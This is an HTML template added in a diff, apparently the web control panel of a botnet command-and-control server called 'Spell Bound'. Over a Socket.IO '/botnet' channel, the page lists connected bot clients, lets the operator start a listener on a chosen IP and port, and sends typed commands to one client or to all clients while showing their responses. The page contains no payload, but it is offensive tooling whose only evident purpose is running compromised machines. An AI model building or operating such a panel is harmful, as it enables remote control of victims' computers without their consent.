@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>C2C Server</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700;800&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      body {
+        font-family: "Montserrat", sans-serif;
+        background-color: #0f172a;
+        padding: 0;
+        background-image: url({{url_for('static', filename='hello.gif')}});
+        background-size:cover;
+      }
+
+      input {
+        width: 445px;
+        border: 2px solid green;
+        padding: 12px;
+        border-radius: 10px;
+        background: rgba(10, 10, 10, 0.075);
+        font-size: 14px;
+        color: green;
+        font-weight: bolder;
+      }
+      input:focus {
+        outline: none;
+      }
+
+      form>div{
+        width: 450px;
+        border: 2px solid green;
+        padding: 12px;
+        border-radius: 10px;
+        background-color: rgba(37, 36, 36, 0.466);
+        font-size: 14px;
+        color: green;
+        font-weight: 600;
+        font-weight:bold
+      }
+      form>div:focus {
+        outline: none;
+      }
+
+      form {
+        display: flex;
+        flex-direction: column;
+        padding: 20px;
+        gap: 20px;
+        background: rgba(10, 10, 10, 0.753);
+        backdrop-filter: blur(12px);
+        -webkit-backdrop-filter: blur(12px);
+        border-radius: 10px;
+        border: 3px solid green;
+        margin-bottom: 32px;
+        cursor: pointer;
+      }
+      form > button {
+        border: none;
+        padding: 12px;
+        border-radius: 10px;
+        background-color: #350513;
+        font-size: 20px;
+        color: rgb(146, 145, 145);
+        font-weight: 600;
+      }
+      form > button:hover {
+        opacity: 0.9;
+      }
+      input::-webkit-outer-spin-button,
+      input::-webkit-inner-spin-button {
+        -webkit-appearance: none;
+        margin: 0;
+      }
+    </style>
+    <script src="//code.jquery.com/jquery-1.12.4.min.js"></script>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/socket.io/4.2.0/socket.io.js"></script>
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/p5.js/1.4.2/p5.js"
+      integrity="sha512-+tu0+vUXyZX+S51npa//IN6znNTLZsBoy8mXn9WzHxfBqYMy6gOzzfTK0VqZf9O171RY9AJviHDokCnvEq8+1A=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    ></script>
+    <script type="text/javascript" charset="utf-8">
+      clients=[]
+      i = 0
+      $(document).ready(function () {
+        namespace = "/botnet";
+        var socket = io(namespace);
+
+        socket.on("connect", function () {
+          socket.emit("my_event", { data: "Connected" });
+        });
+        socket.on("connected_clients", function(msg, cb){
+          
+          clients=msg.data
+          console.log(clients)
+          var select = document.getElementById("client");
+          var opt = clients.at(-1);
+          opt += i;
+          i += 1;
+          var el = document.createElement("option");
+          el.textContent = opt;
+          el.value = opt;
+          select.appendChild(el);
+        });
+
+        socket.on('printer', function(msg, cb){
+          if (msg.data.indexOf('+')!=-1)
+              $('#logs').append('<p style = "color:#dc143c ; text-align: center">'+msg.data+'</p>')
+          else if (msg.data.indexOf('\'')!=-1)
+          $('#logs').append('<p style = "color:purple; text-align: center">'+msg.data+'</p>')
+          else
+              $('#logs').append('<p style = "color:green; text-align: center; justify-content: center; word-wrap: break-word;">'+msg.data+'</p>')
+        });
+
+        $("form#controls").submit(function (event) {
+          let ip = $("#IP").val();
+          let portno = $("#Port").val();
+
+          data = {
+            IP:ip,
+            Port:portno,
+          };
+          socket.emit("parse", { data: data });
+          return false;
+        });
+        $("form#commands").submit(function(event){
+          let msg = $("#message").val();
+          let cli = $("#client").val();
+          data = {
+            message:msg,
+            client:cli
+          };
+          socket.emit('sendMessage',{data:data});
+          document.getElementById('logs').innerHTML=""
+          return false;
+        });
+      });
+
+
+    </script>
+  </head>
+  
+  <body>
+    
+    <p
+      style="
+        color: rgba(255, 255, 255, 0.692);
+        font-size: 45px;
+        text-align: center;
+        font-weight: bolder;
+        
+      "
+    >
+      Spell Bound
+    </p>
+    <div
+      id="main"
+      style="
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        word-wrap: break-word;
+      "
+    > 
+      <form id="controls" method="POST" action="#">
+        <input type="text" id="IP" placeholder="Server IP" required />
+        <input type="text" id="Port" placeholder="Server Port" required />
+        <button type="submit">Start</button>
+        <div id="logs"></div> 
+      </form> 
+        <form id="commands" method="POST">
+          <input type="text" id="message" placeholder="Command/ Instrucion" required />
+          <select id = "client" style="
+          background-color: transparent;
+          font-size: 20px;
+          border-color: green;
+          color: grey;
+          border-radius: 8px;
+          text-indent: 10px;
+          ">
+          <option>Client</option>
+          <option value="All">All</option>
+        </select>
+          <button type="submit">Send</button>
+          </form>
+    </div>
+    
+  </body>
+</html>
